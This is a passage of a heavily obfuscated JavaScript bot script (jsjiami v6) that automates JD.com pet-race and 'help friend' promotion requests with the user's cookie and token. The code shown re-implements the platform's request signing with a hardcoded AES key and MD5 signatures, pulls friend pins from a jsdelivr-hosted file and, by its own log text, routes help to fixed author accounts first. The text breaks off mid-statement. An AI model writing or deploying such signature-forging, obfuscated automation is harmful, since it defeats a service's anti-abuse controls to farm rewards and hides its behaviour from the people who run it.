_0x4e9585={'url':'//draw.jdfcloud.com/common/pet/helpFriend?friendPin='+_0x2e9cc8['vbZGb'](encodeURI,_0x215556)+_0x1235('11b',')M8m'),'method':_0x2e9cc8[_0x1235('11c',')Nqh')],'data':{},'credentials':_0x2e9cc8[_0x1235('11d','bBuq')],'header':{'content-type':_0x1235('11e','UGN$')}};const _0x5bdc54=_0x2e9cc8[_0x1235('11f','NW37')]('https:',taroRequest(_0x4e9585)[_0x2e9cc8[_0x1235('120','d(zg')]])+$[_0x1235('121','$L*u')];const _0x5e3353={'url':_0x5bdc54,'headers':headers};$[_0x1235('122','NW37')](_0x5e3353,(_0x394a28,_0x5b7521,_0x298e3f)=>{var _0xc4ab97={'oguaA':_0x44cbfd[_0x1235('123','8kX#')]};try{if(_0x394a28){if(_0x44cbfd[_0x1235('124','989M')](_0x44cbfd['vjkLP'],_0x44cbfd[_0x1235('125','zUDq')])){$[_0x1235('126','$L*u')]('API请求失败');$['logErr'](JSON['stringify'](_0x394a28));}else{$[_0x1235('fe','kEvR')]=_0x298e3f[0x0][_0x1235('127','%^Dk')];}}else{if(_0x44cbfd['zMvdt'](_0x1235('128','b27O'),_0x1235('129','feH('))){$['log'](_0x1235('12a','2sFc')+_0x298e3f);_0x298e3f=JSON[_0x1235('ec','jW!j')](_0x298e3f);if(_0x298e3f[_0x1235('12b','MM%a')]&&_0x44cbfd[_0x1235('12c','fgyc')](_0x298e3f[_0x1235('a1','unAi')],_0x1235('12d','MM%a'))){$[_0x1235('12e','b27O')]+=0x1e;}}else{$[_0x1235('12f','feH(')](_0x44cbfd[_0x1235('130','2sFc')]);$['logErr'](JSON[_0x1235('131','NW37')](_0x394a28));}}}catch(_0x431878){if(_0x44cbfd[_0x1235('132','sD^W')](_0x44cbfd[_0x1235('133','[8qn')],'Gqvuo')){$[_0x1235('134','feH(')](_0x431878,_0x5b7521);}else{invite_pins=[];invite_pins['push']($[_0x1235('135','bBuq')](_0xc4ab97[_0x1235('136','8kX#')]));}}finally{if(_0x44cbfd[_0x1235('132','sD^W')](_0x44cbfd[_0x1235('137','UGN$')],_0x1235('138','9ocf'))){_0x44cbfd['fHifb'](_0x46590b,_0x298e3f);}else{try{return JSON[_0x1235('139','bBuq')](str);}catch(_0x3cfde3){console[_0x1235('13a','unAi')](_0x3cfde3);$[_0x1235('13b','zUDq')]($[_0x1235('13c','989M')],'',_0x1235('13d','kFu2'));return[];}}}});});}async function run(_0x380819){var _0x144b98={'xPIHy':function(_0x3a632e,_0x2c3299){return _0x3a632e/_0x2c3299;},'KHcUQ':function(_0x4411f9,_0x1769ef){return _0x4411f9===_0x1769ef;},'IrxJh':function(_0x4c71cc,_0x5f4cd6){return _0x4c71cc(_0x5f4cd6);},'gsqSW':_0x1235('13e','sD^W'),'gSsnG':_0x1235('13f','2sFc'),'FZGqz':'can_help','kEyXA':_0x1235('140','MM%a'),'PfsvT':_0x1235('141','2sFc'),'obmGr':_0x1235('142','unAi'),'xvnmZ':'jdJoyRunToken','zfkTF':_0x1235('143','bBuq'),'axVcy':'iOS用户微信搜索\x27来客有礼\x27小程序\x0a点击底部的\x27发现\x27Tab\x0a即可获取Token','VwpRb':function(_0x25d146,_0x3f5357){return _0x25d146!==_0x3f5357;},'vEFAX':_0x1235('144',')M8m')};console['log']('账号'+$[_0x1235('145','fgyc')]+'\x20['+UserName+_0x1235('146','bBuq')+_0x380819[_0x1235('147','%^Dk')](_0x11d0e8=>_0x11d0e8['trim']())+'\x0a');for(let _0x1847c2 of _0x380819['map'](_0x1847c2=>_0x1847c2[_0x1235('148','&xWG')]())){console[_0x1235('149','PBi@')](_0x1235('14a','HyjP')+$[_0x1235('14b','UGN$')]+'\x20['+UserName+_0x1235('14c','fgyc')+_0x1847c2+']\x20进行赛跑助力');if(_0x144b98[_0x1235('14d','kFu2')](UserName,_0x1847c2)){console[_0x1235('c1','A62r')]('自己账号，跳过');continue;}const _0x2b16ae=await _0x144b98[_0x1235('14e','FgMD')](combatDetail,_0x1847c2);const {petRaceResult}=_0x2b16ae[_0x1235('14f','d(zg')];console[_0x1235('150',')Nqh')](_0x1235('151','ZN3c')+petRaceResult);if(_0x144b98['KHcUQ'](petRaceResult,_0x144b98[_0x1235('152','NW37')])){console['log'](_0x144b98[_0x1235('153','HyjP')]);break;}else if(petRaceResult===_0x144b98['FZGqz']){if(_0x144b98[_0x1235('154','[8qn')]===_0x144b98[_0x1235('155','kEvR')]){let _0x3ab9ee='';if($[_0x1235('156','989M')]>0x0){_0x3ab9ee+='给'+$['inviteReward']/0x1e+'人邀请助力成功,获得'+$[_0x1235('157','Q6y*')]+'积分\x0a';}if($[_0x1235('58',')M8m')]>0x0){_0x3ab9ee+='给'+_0x144b98['xPIHy']($[_0x1235('158','s1&l')],0x5)+_0x1235('159','unAi')+$['runReward']+'g';}if(_0x3ab9ee){$['msg']($[_0x1235('15a','SzJ#')],'',_0x1235('15b','SzJ#')+$[_0x1235('15c','ERAq')]+'\x20'+UserName+'\x0a'+_0x3ab9ee);}}else{console['log'](_0x1235('15d','yqe!')+_0x1847c2);const _0x1d8a14=await combatHelp(_0x1847c2);if(_0x144b98['KHcUQ'](_0x1d8a14[_0x1235('15e','MM%a')],_0x1235('15f','HyjP'))&&!_0x1d8a14[_0x1235('160','b27O')]){console[_0x1235('7c','C)](')](_0x144b98[_0x1235('161','989M')]);$['setdata']('',_0x144b98[_0x1235('162','jW!j')]);$[_0x1235('163','s1&l')]($[_0x1235('164',')M8m')],_0x144b98[_0x1235('165','bBuq')],_0x144b98['axVcy']);$['LKYLLogin']=![];break;}else{if(_0x144b98[_0x1235('166','jW!j')](_0x144b98[_0x1235('167','QjOz')],_0x1235('168','A62r'))){console['log'](_0x1235('169','&xWG')+_0x1847c2+_0x1235('16a','kEvR'));}else{$[_0x1235('16b','5Xgv')]=!![];}}}}}}function combatHelp(_0x3a698b){var _0xff61fe={'MscqA':_0x1235('16c','jW!j'),'WDopR':function(_0xa1c2d9,_0x1988e3){return _0xa1c2d9*_0x1988e3;},'Ndajh':function(_0x241cf3,_0x2c5d19){return _0x241cf3===_0x2c5d19;},'jnaaE':'CwXjU','VXFGA':_0x1235('16d','8kji'),'kREtp':function(_0x540689,_0x5d8039){return _0x540689!==_0x5d8039;},'SSphE':'zjEFJ','GSOua':_0x1235('16e','FgMD'),'ruDmR':_0x1235('16f','bBuq'),'YqnTu':_0x1235('170','kEvR'),'kBCFD':'nmqDR','HaKmI':function(_0x924b67,_0x12d12f){return _0x924b67(_0x12d12f);},'KYRds':function(_0x36b97f,_0x2a40b8){return _0x36b97f(_0x2a40b8);},'TLpIG':'include','ixYAT':_0x1235('171','&xWG'),'ZtCCk':function(_0x5ad3e5,_0x6105d4){return _0x5ad3e5+_0x6105d4;},'BBzqa':function(_0x25a28c,_0x52b3b4){return _0x25a28c(_0x52b3b4);},'qZnQg':'url'};return new Promise(_0x1e564b=>{headers[_0x1235('172','feH(')]=cookie;headers[_0x1235('173','UGN$')]=$[_0x1235('119','fMn]')];let _0x6e7d4c={'url':_0x1235('174','&xWG')+_0xff61fe[_0x1235('175','qNM1')](encodeURI,_0x3a698b)+'&invokeKey=qRKHmL4sna8ZOP9F','method':_0x1235('176','d(zg'),'data':{},'credentials':_0xff61fe[_0x1235('177','py[V')],'header':{'content-type':_0xff61fe[_0x1235('178','$L*u')]}};const _0x5c8b80=_0xff61fe[_0x1235('179','A62r')](_0xff61fe['ZtCCk'](_0x1235('17a','FgMD'),_0xff61fe['BBzqa'](taroRequest,_0x6e7d4c)[_0xff61fe[_0x1235('17b','8kji')]]),$[_0x1235('17c','!n#]')]);const _0x480090={'url':_0x5c8b80,'headers':headers};$['get'](_0x480090,(_0x2e4f86,_0x1eb1c3,_0x43cfb7)=>{var _0x5a8ad9={'TIFal':_0xff61fe[_0x1235('17d','MM%a')],'frkPq':function(_0x34490b,_0xbad031){return _0x34490b(_0xbad031);},'brPte':function(_0xf9296e,_0x42e624){return _0xff61fe[_0x1235('17e','TNFl')](_0xf9296e,_0x42e624);}};if(_0xff61fe['Ndajh'](_0xff61fe[_0x1235('17f','ZN3c')],_0xff61fe['VXFGA'])){console[_0x1235('5d','NW37')]('\x0a赛跑先给作者两个固定的pin进行助力,然后从账号内部与剩下的固定位置合并后随机抽取进行助力\x0a如需自己账号内部互助,设置环境变量\x20JOY_RUN_HELP_MYSELF\x20为true,则开启账号内部互助\x0a');run_pins=run_pins[0x0]['split'](',');run_pins=[...new Set(run_pins)];let _0x3225f7=run_pins[_0x1235('180','T8Rj')](run_pins[_0x1235('181','py[V')](_0x1235('182','CJJx')),0x1);_0x3225f7[_0x1235('183','$L*u')](...run_pins['splice'](run_pins[_0x1235('184','kFu2')](_0x5a8ad9[_0x1235('185','jW!j')]),0x1));const _0x712955=getRandomArrayElements(run_pins,run_pins[_0x1235('186','C)](')]);run_pins=[[..._0x3225f7,..._0x712955][_0x1235('187','Al2h')](',')];invite_pins=run_pins;}else{try{if(_0xff61fe[_0x1235('188','2sFc')](_0xff61fe[_0x1235('189','5Xgv')],_0xff61fe['SSphE'])){$[_0x1235('18a','5Xgv')]($[_0x1235('18b','PBi@')],'','京东账号'+$['index']+'\x20'+UserName+'\x0a'+message);}else{if(_0x2e4f86){if(_0xff61fe[_0x1235('18c','bBuq')](_0xff61fe['GSOua'],_0xff61fe['GSOua'])){_0x5a8ad9[_0x1235('18d','CJJx')](_0x1e564b,_0x43cfb7);}else{$[_0x1235('18e','zW^G')](_0xff61fe[_0x1235('18f','$L*u')]);$[_0x1235('190','%^Dk')](JSON[_0x1235('191','8kji')](_0x2e4f86));}}else{$[_0x1235('192','8kji')](_0x1235('ef','$L*u')+_0x43cfb7);_0x43cfb7=JSON['parse'](_0x43cfb7);if(_0x43cfb7[_0x1235('193',')Nqh')]===_0xff61fe[_0x1235('194','zUDq')]&&_0xff61fe[_0x1235('195','PBi@')](_0x43cfb7[_0x1235('196','qNM1')]['helpStatus'],_0x1235('197','SzJ#'))){if(_0xff61fe['kREtp'](_0x1235('198','SzJ#'),_0xff61fe[_0x1235('199','TNFl')])){index=Math[_0x1235('19a','HyjP')](_0x5a8ad9['brPte'](i+0x1,Math['random']()));temp=shuffled[index];shuffled[index]=shuffled[i];shuffled[i]=temp;}else{console['log']('助力'+_0x3a698b+_0x1235('19b','Q6y*')+_0x43cfb7[_0x1235('19c','NW37')]['rewardNum']+'g\x0a');$[_0x1235('19d','fgyc')]+=_0x43cfb7[_0x1235('19e','HyjP')]['rewardNum'];}}}}}catch(_0x2a4ff0){$['logErr'](_0x2a4ff0,_0x1eb1c3);}finally{_0xff61fe[_0x1235('19f','HyjP')](_0x1e564b,_0x43cfb7);}}});});}function combatDetail(_0x26b070){var _0x3977f3={'HwBdf':_0x1235('1a0','C)]('),'kpDof':function(_0x283530,_0xeb5bc4){return _0x283530!==_0xeb5bc4;},'BprpH':_0x1235('1a1','kFu2'),'xMtII':function(_0x51ca85,_0x33ea62){return _0x51ca85(_0x33ea62);},'mgctq':_0x1235('1a2','$L*u'),'jSEdW':function(_0x2ec027,_0x202ee1){return _0x2ec027===_0x202ee1;},'kwNyb':_0x1235('1a3','SzJ#'),'vSXkN':function(_0x15055c,_0xf8e23a){return _0x15055c(_0xf8e23a);},'qdFAw':'GET','WYDdn':'include','ohMQb':_0x1235('1a4','DVjE'),'mrYLQ':function(_0x510d70,_0x21c9be){return _0x510d70+_0x21c9be;},'tQnqB':function(_0x544359,_0x59c2de){return _0x544359+_0x59c2de;},'JyBYb':_0x1235('1a5','Q6y*')};return new Promise(_0x387c2b=>{var _0x12d5a9={'NThTP':_0x3977f3[_0x1235('1a6','LBLt')],'ervSI':_0x1235('1a7','QjOz'),'eUULI':function(_0x4cc237,_0x2dd96b){return _0x3977f3[_0x1235('1a8','yqe!')](_0x4cc237,_0x2dd96b);},'GWLcg':_0x3977f3[_0x1235('1a9','$L*u')],'FHlth':function(_0x4ab9b0,_0x403078){return _0x3977f3['xMtII'](_0x4ab9b0,_0x403078);},'qiRez':function(_0x388ccd,_0x570cdb){return _0x388ccd>_0x570cdb;},'tlilj':_0x3977f3[_0x1235('1aa','d(zg')]};if(_0x3977f3['jSEdW'](_0x3977f3[_0x1235('1ab','sD^W')],_0x3977f3[_0x1235('1ac','zUDq')])){headers['Cookie']=cookie;headers['LKYLToken']=$[_0x1235('1ad','!n#]')];let _0x516d57={'url':_0x1235('1ae','ZN3c')+_0x3977f3['vSXkN'](encodeURI,_0x26b070)+_0x1235('1af','s1&l'),'method':_0x3977f3['qdFAw'],'data':{},'credentials':_0x3977f3[_0x1235('1b0','T8Rj')],'header':{'content-type':_0x3977f3[_0x1235('1b1','9ocf')]}};const _0x5e8205=_0x3977f3['mrYLQ'](_0x3977f3[_0x1235('1b2','8kX#')](_0x3977f3[_0x1235('1b3','2sFc')],_0x3977f3[_0x1235('1b4','&xWG')](taroRequest,_0x516d57)['url']),$[_0x1235('1b5','s1&l')]);const _0x5a72dd={'url':_0x5e8205,'headers':headers};$[_0x1235('1b6','zW^G')](_0x5a72dd,(_0x687dcc,_0x3737be,_0x499403)=>{try{if(_0x687dcc){$[_0x1235('c7','!n#]')](_0x12d5a9['ervSI']);$[_0x1235('1b7','SzJ#')](JSON[_0x1235('1b8','ERAq')](_0x687dcc));}else{_0x499403=JSON[_0x1235('10c','Q6y*')](_0x499403);}}catch(_0xfd5b5d){$[_0x1235('10e','py[V')](_0xfd5b5d,_0x3737be);}finally{if(_0x12d5a9[_0x1235('1b9','&xWG')]('PwPHT',_0x12d5a9[_0x1235('1ba','ERAq')])){_0x12d5a9['FHlth'](_0x387c2b,_0x499403);}else{$[_0x1235('1bb','py[V')]=_0x499403&&JSON['parse'](_0x499403);if($[_0x1235('1bc','%^Dk')]&&$[_0x1235('1bd','s1&l')][_0x12d5a9[_0x1235('1be','b27O')]]){friendsArr=$[_0x1235('1bf','fMn]')][_0x12d5a9['NThTP']];console[_0x1235('18e','zW^G')](_0x1235('1c0','feH(')+friendsArr[_0x1235('1c1',')Nqh')]+_0x1235('1c2','989M'));}}}});}else{if(_0x12d5a9[_0x1235('1c3','fMn]')](run_pins['length'],0x0)){run_pins['push']($[_0x1235('1c4','ERAq')](_0x12d5a9[_0x1235('1c5','zUDq')]));}else{run_pins=[];run_pins[_0x1235('1c6','!n#]')]($['getdata']('jd2_joy_run_pin'));}}});}function isURL(_0x25fd1c,_0x54288b){return _0x54288b[_0x1235('1c7','Q6y*')](_0x25fd1c);}function jsonParse(_0x5e6325){var _0x11b9db={'hxjjH':'string','PBoNO':function(_0x78cac,_0x2c5c64){return _0x78cac!==_0x2c5c64;},'CzQOk':'aKJcg','xuLBs':'UUiHp'};if(typeof _0x5e6325==_0x11b9db['hxjjH']){try{if(_0x11b9db['PBoNO'](_0x11b9db[_0x1235('1c8','FgMD')],_0x11b9db[_0x1235('1c9',')M8m')])){return JSON[_0x1235('8a','feH(')](_0x5e6325);}else{$['logErr'](e,resp);}}catch(_0x5d09a3){console[_0x1235('59','CJJx')](_0x5d09a3);$[_0x1235('1ca','feH(')]($[_0x1235('1cb','MM%a')],'',_0x1235('1cc','CJJx'));return[];}}}function getRandomArrayElements(_0x2cb163,_0x5686aa){var _0x235075={'KxbKy':function(_0x49ec39,_0x38bdfd){return _0x49ec39-_0x38bdfd;},'lwaei':function(_0x990263,_0x1921f2){return _0x990263>_0x1921f2;},'LvMnw':function(_0x2ff278,_0x411366){return _0x2ff278*_0x411366;},'jASoB':function(_0x1fb6ea,_0xd354e3){return _0x1fb6ea+_0xd354e3;}};let _0x6d7d93=_0x2cb163[_0x1235('1cd','QjOz')](0x0),_0x10c53d=_0x2cb163[_0x1235('1ce','8kji')],_0x148621=_0x235075[_0x1235('1cf','zW^G')](_0x10c53d,_0x5686aa),_0xf22325,_0x381d20;while(_0x235075[_0x1235('1d0','9ocf')](_0x10c53d--,_0x148621)){_0x381d20=Math[_0x1235('1d1','Q6y*')](_0x235075[_0x1235('1d2','fMn]')](_0x235075['jASoB'](_0x10c53d,0x1),Math[_0x1235('1d3','kEvR')]()));_0xf22325=_0x6d7d93[_0x381d20];_0x6d7d93[_0x381d20]=_0x6d7d93[_0x10c53d];_0x6d7d93[_0x10c53d]=_0xf22325;}return _0x6d7d93[_0x1235('1d4','kEvR')](_0x148621);}function getFriendPins(){var _0x1d9b90={'zFmzW':function(_0x363d1b,_0xa5c9df){return _0x363d1b(_0xa5c9df);},'IJUFX':function(_0x3e0839){return _0x3e0839();},'sBCGb':function(_0x390d40,_0x459e2d){return _0x390d40!==_0x459e2d;},'HmBjz':'FXTjH','SZDus':_0x1235('1d5','LBLt'),'sSePe':'https://cdn.jsdelivr.net/gh/gitupdate/friendPin@main/friendPins.json','EghwF':'Mozilla/5.0\x20(iPhone;\x20CPU\x20iPhone\x20OS\x2013_2_3\x20like\x20Mac\x20OS\x20X)\x20AppleWebKit/605.1.15\x20(KHTML,\x20like\x20Gecko)\x20Version/13.0.3\x20Mobile/15E148\x20Safari/604.1\x20Edg/87.0.4280.88'};return new Promise(_0x1746ac=>{var _0x1db296={'NiNpr':function(_0x3b8f09,_0x43463f){return _0x1d9b90[_0x1235('1d6',')Nqh')](_0x3b8f09,_0x43463f);},'yfzcD':function(_0x2ae096,_0x140745){return _0x2ae096!==_0x140745;},'xDNyn':_0x1235('1d7','$L*u'),'opqdc':function(_0x592c80){return _0x1d9b90[_0x1235('1d8','zW^G')](_0x592c80);}};if(_0x1d9b90[_0x1235('1d9',')M8m')](_0x1d9b90['HmBjz'],_0x1d9b90['SZDus'])){$['get']({'url':_0x1d9b90[_0x1235('1da','[8qn')],'headers':{'User-Agent':_0x1d9b90[_0x1235('1db','TNFl')]},'timeout':0x186a0},async(_0x5b2e6f,_0x5e8176,_0x39a839)=>{try{if(_0x5b2e6f){console['log'](_0x1235('1dc','s1&l')+JSON['stringify'](_0x5b2e6f));}else{$['friendPins']=_0x39a839&&JSON['parse'](_0x39a839);if($['friendPins']&&$['friendPins'][_0x1235('1dd','9ocf')]){if(_0x1db296['yfzcD']('gShxD','sPsMp')){friendsArr=$['friendPins'][_0x1db296[_0x1235('1de','[8qn')]];console[_0x1235('af','LBLt')]('\x0a共提供\x20'+friendsArr[_0x1235('1df','fgyc')]+_0x1235('1e0','DVjE'));}else{_0x1db296['NiNpr'](_0x1746ac,_0x39a839);}}}}catch(_0x516cb1){$[_0x1235('134','feH(')](_0x516cb1,_0x5e8176);}finally{_0x1db296[_0x1235('1e1','NW37')](_0x1746ac);}});}else{$[_0x1235('1e2','5Xgv')]($[_0x1235('30','Q6y*')]+_0x1235('1e3','T8Rj'));$['log'](JSON[_0x1235('1e4','%^Dk')](err));}});};_0xodo='jsjiami.com.v6';
isRequest ? getToken() : main();
var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxb227b=["\x69\x73\x4E\x6F\x64\x65","\x63\x72\x79\x70\x74\x6F\x2D\x6A\x73","\x39\x38\x63\x31\x34\x63\x39\x39\x37\x66\x64\x65\x35\x30\x63\x63\x31\x38\x62\x64\x65\x66\x65\x63\x66\x64\x34\x38\x63\x65\x62\x37","\x70\x61\x72\x73\x65","\x55\x74\x66\x38","\x65\x6E\x63","\x65\x61\x36\x35\x33\x66\x34\x66\x33\x63\x35\x65\x64\x61\x31\x32","\x63\x69\x70\x68\x65\x72\x74\x65\x78\x74","\x43\x42\x43","\x6D\x6F\x64\x65","\x50\x6B\x63\x73\x37","\x70\x61\x64","\x65\x6E\x63\x72\x79\x70\x74","\x41\x45\x53","\x48\x65\x78","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x42\x61\x73\x65\x36\x34","\x64\x65\x63\x72\x79\x70\x74","\x6C\x65\x6E\x67\x74\x68","\x6D\x61\x70","\x73\x6F\x72\x74","\x6B\x65\x79\x73","\x67\x69\x66\x74","\x70\x65\x74","\x69\x6E\x63\x6C\x75\x64\x65\x73","\x26","\x6A\x6F\x69\x6E","\x3D","\x3F","\x69\x6E\x64\x65\x78\x4F\x66","\x63\x6F\x6D\x6D\x6F\x6E\x2F","\x72\x65\x70\x6C\x61\x63\x65","\x68\x65\x61\x64\x65\x72","\x75\x72\x6C","\x72\x65\x71\x53\x6F\x75\x72\x63\x65\x3D\x68\x35","\x61\x73\x73\x69\x67\x6E","\x6D\x65\x74\x68\x6F\x64","\x47\x45\x54","\x64\x61\x74\x61","\x74\x6F\x4C\x6F\x77\x65\x72\x43\x61\x73\x65","\x6B\x65\x79\x43\x6F\x64\x65","\x63\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65","","\x67\x65\x74","\x70\x6F\x73\x74","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x5F","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function taroRequest(_0x1226x2){const _0x1226x3=$[__Oxb227b[0x0]]()?require(__Oxb227b[0x1]):CryptoJS;const _0x1226x4=__Oxb227b[0x2];const _0x1226x5=_0x1226x3[__Oxb227b[0x5]][__Oxb227b[0x4]][__Oxb227b[0x3]](_0x1226x4);const _0x1226x6=_0x1226x3[__Oxb227b[0x5]][__Oxb227b[0x4]][__Oxb227b[0x3]](__Oxb227b[0x6]);let _0x1226x7={"\x41\x65\x73\x45\x6E\x63\x72\x79\x70\x74":function _0x1226x8(_0x1226x2){var _0x1226x9=_0x1226x3[__Oxb227b[0x5]][__Oxb227b[0x4]][__Oxb227b[0x3]](_0x1226x2);return _0x1226x3[__Oxb227b[0xd]][__Oxb227b[0xc]](_0x1226x9,_0x1226x5,{"\x69\x76":_0x1226x6,"\x6D\x6F\x64\x65":_0x1226x3[__Oxb227b[0x9]][__Oxb227b[0x8]],"\x70\x61\x64\x64\x69\x6E\x67":_0x1226x3[__Oxb227b[0xb]][__Oxb227b[0xa]]})[__Oxb227b[0x7]].toString()},"\x41\x65\x73\x44\x65\x63\x72\x79\x70\x74":function _0x1226xa(_0x1226x2){var _0x1226x9=_0x1226x3[__Oxb227b[0x5]][__Oxb227b[0xe]][__Oxb227b[0x3]](_0x1226x2),_0x1226xb=_0x1226x3[__Oxb227b[0x5]][__Oxb227b[0x10]][__Oxb227b[0xf]](_0x1226x9);return _0x1226x3[__Oxb227b[0xd]][__Oxb227b[0x11]](_0x1226xb,_0x1226x5,{"\x69\x76":_0x1226x6,"\x6D\x6F\x64\x65":_0x1226x3[__Oxb227b[0x9]][__Oxb227b[0x8]],"\x70\x61\x64\x64\x69\x6E\x67":_0x1226x3[__Oxb227b[0xb]][__Oxb227b[0xa]]}).toString(_0x1226x3[__Oxb227b[0x5]].Utf8).toString()},"\x42\x61\x73\x65\x36\x34\x45\x6E\x63\x6F\x64\x65":function _0x1226xc(_0x1226x2){var _0x1226x9=_0x1226x3[__Oxb227b[0x5]][__Oxb227b[0x4]][__Oxb227b[0x3]](_0x1226x2);return _0x1226x3[__Oxb227b[0x5]][__Oxb227b[0x10]][__Oxb227b[0xf]](_0x1226x9)},"\x42\x61\x73\x65\x36\x34\x44\x65\x63\x6F\x64\x65":function _0x1226xd(_0x1226x2){return _0x1226x3[__Oxb227b[0x5]][__Oxb227b[0x10]][__Oxb227b[0x3]](_0x1226x2).toString(_0x1226x3[__Oxb227b[0x5]].Utf8)},"\x4D\x64\x35\x65\x6E\x63\x6F\x64\x65":function _0x1226xe(_0x1226x2){return _0x1226x3.MD5(_0x1226x2).toString()},"\x6B\x65\x79\x43\x6F\x64\x65":__Oxb227b[0x2]};const _0x1226xf=function _0x1226x10(_0x1226x2,_0x1226x9){if(_0x1226x2 instanceof  Array){_0x1226x9= _0x1226x9|| [];for(var _0x1226xb=0;_0x1226xb< _0x1226x2[__Oxb227b[0x12]];_0x1226xb++){_0x1226x9[_0x1226xb]= _0x1226x10(_0x1226x2[_0x1226xb],_0x1226x9[_0x1226xb])}}else {!(_0x1226x2 instanceof  Array)&& _0x1226x2 instanceof  Object?(_0x1226x9= _0x1226x9|| {},Object[__Oxb227b[0x15]](_0x1226x2)[__Oxb227b[0x14]]()[__Oxb227b[0x13]](function(_0x1226xb){_0x1226x9[_0x1226xb]= _0x1226x10(_0x1226x2[_0x1226xb],_0x1226x9[_0x1226xb])})):_0x1226x9= _0x1226x2};return _0x1226x9};const _0x1226x11=function _0x1226x12(_0x1226x2){for(var _0x1226x9=[__Oxb227b[0x16],__Oxb227b[0x17]],_0x1226xb=!1,_0x1226x3=0;_0x1226x3< _0x1226x9[__Oxb227b[0x12]];_0x1226x3++){var _0x1226x4=_0x1226x9[_0x1226x3];_0x1226x2[__Oxb227b[0x18]](_0x1226x4)&&  !_0x1226xb&& (_0x1226xb=  !0)};return _0x1226xb};const _0x1226x13=function _0x1226x14(_0x1226x2,_0x1226x9){if(_0x1226x9&& Object[__Oxb227b[0x15]](_0x1226x9)[__Oxb227b[0x12]]> 0){var _0x1226xb=Object[__Oxb227b[0x15]](_0x1226x9)[__Oxb227b[0x13]](function(_0x1226x2){return _0x1226x2+ __Oxb227b[0x1b]+ _0x1226x9[_0x1226x2]})[__Oxb227b[0x1a]](__Oxb227b[0x19]);return _0x1226x2[__Oxb227b[0x1d]](__Oxb227b[0x1c])>= 0?_0x1226x2+ __Oxb227b[0x19]+ _0x1226xb:_0x1226x2+ __Oxb227b[0x1c]+ _0x1226xb};return _0x1226x2};const _0x1226x15=function _0x1226x16(_0x1226x2){for(var _0x1226x9=_0x1226x6,_0x1226xb=0;_0x1226xb< _0x1226x9[__Oxb227b[0x12]];_0x1226xb++){var _0x1226x3=_0x1226x9[_0x1226xb];_0x1226x2[__Oxb227b[0x18]](_0x1226x3)&&  !_0x1226x2[__Oxb227b[0x18]](__Oxb227b[0x1e]+ _0x1226x3)&& (_0x1226x2= _0x1226x2[__Oxb227b[0x1f]](_0x1226x3,__Oxb227b[0x1e]+ _0x1226x3))};return _0x1226x2};var _0x1226x9=_0x1226x2,_0x1226xb=(_0x1226x9[__Oxb227b[0x20]],_0x1226x9[__Oxb227b[0x21]]);_0x1226xb+= (_0x1226xb[__Oxb227b[0x1d]](__Oxb227b[0x1c])>  -1?__Oxb227b[0x19]:__Oxb227b[0x1c])+ __Oxb227b[0x22];var _0x1226x17=function _0x1226x18(_0x1226x2){var _0x1226x9=_0x1226x2[__Oxb227b[0x21]],_0x1226xb=_0x1226x2[__Oxb227b[0x24]],_0x1226x3=void(0)=== _0x1226xb?__Oxb227b[0x25]:_0x1226xb,_0x1226x4=_0x1226x2[__Oxb227b[0x26]],_0x1226x6=_0x1226x2[__Oxb227b[0x20]],_0x1226x19=void(0)=== _0x1226x6?{}:_0x1226x6,_0x1226x1a=_0x1226x3[__Oxb227b[0x27]](),_0x1226x1b=_0x1226x7[__Oxb227b[0x28]],_0x1226x1c=_0x1226x19[__Oxb227b[0x29]]|| _0x1226x19[__Oxb227b[0x2a]]|| __Oxb227b[0x2b],_0x1226x1d=__Oxb227b[0x2b],_0x1226x1e=+ new Date();return _0x1226x1d= __Oxb227b[0x2c]!== _0x1226x1a&& (__Oxb227b[0x2d]!== _0x1226x1a|| __Oxb227b[0x2e]!== _0x1226x1c[__Oxb227b[0x27]]()&& _0x1226x4&& Object[__Oxb227b[0x15]](_0x1226x4)[__Oxb227b[0x12]])?_0x1226x7.Md5encode(_0x1226x7.Base64Encode(_0x1226x7.AesEncrypt(__Oxb227b[0x2b]+ JSON[__Oxb227b[0xf]](_0x1226xf(_0x1226x4))))+ __Oxb227b[0x2f]+ _0x1226x1b+ __Oxb227b[0x2f]+ _0x1226x1e):_0x1226x7.Md5encode(__Oxb227b[0x2f]+ _0x1226x1b+ __Oxb227b[0x2f]+ _0x1226x1e),_0x1226x11(_0x1226x9)&& (_0x1226x9= _0x1226x13(_0x1226x9,{"\x6C\x6B\x73":_0x1226x1d,"\x6C\x6B\x74":_0x1226x1e}),_0x1226x9= _0x1226x15(_0x1226x9)),Object[__Oxb227b[0x23]](_0x1226x2,{"\x75\x72\x6C":_0x1226x9})}(_0x1226x2= Object[__Oxb227b[0x23]](_0x1226x2,{"\x75\x72\x6C":_0x1226xb}));return _0x1226x17}(function(_0x1226x1f,_0x1226xf,_0x1226x20,_0x1226x21,_0x1226x1c,_0x1226x22){_0x1226x22= __Oxb227b[0x30];_0x1226x21= function(_0x1226x19){if( typeof alert!== _0x1226x22){alert(_0x1226x19)};if( typeof console!== _0x1226x22){console[__Oxb227b[0x31]](_0x1226x19)}};_0x1226x20= function(_0x1226x3,_0x1226x1f){return _0x1226x3+ _0x1226x1f};_0x1226x1c= _0x1226x20(__Oxb227b[0x32],_0x1226x20(_0x1226x20(__Oxb227b[0x33],__Oxb227b[0x34]),__Oxb227b[0x35]));try{_0x1226x1f= __encode;if(!( typeof _0x1226x1f!== 